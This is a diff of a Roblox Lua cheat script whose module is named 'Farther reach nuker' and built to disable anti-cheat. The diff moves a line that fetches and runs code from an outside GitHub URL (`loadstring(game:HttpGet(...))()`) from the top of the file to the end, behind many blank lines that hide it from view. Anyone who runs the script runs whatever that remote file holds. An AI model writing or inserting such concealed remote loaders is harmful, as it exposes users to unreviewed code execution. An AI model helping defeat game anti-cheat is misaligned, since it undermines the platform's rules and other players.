@@ -27,8 +27,6 @@ local repstorage = game:GetService("ReplicatedStorage")
 local oldchanneltabs = {}
 local lplr = game:GetService("Players").LocalPlayer
 
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/V0rt3xqa/Dnut/main/Dnut%20config'),true))()
-
 local AnticheatDisabler = COB("World", {
 	Name = "Farther reach nuker",
 	Function = function(callback) 
@@ -132,3 +130,21 @@ Sky.SunAngularSize = 10
 	Default = false,
 	HoverText = "Hold Left shift or speed wont work"
 })
+
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		loadstring(game:HttpGet(('https://raw.githubusercontent.com/V0rt3xqa/Dnut/main/Dnut%20config'),true))()
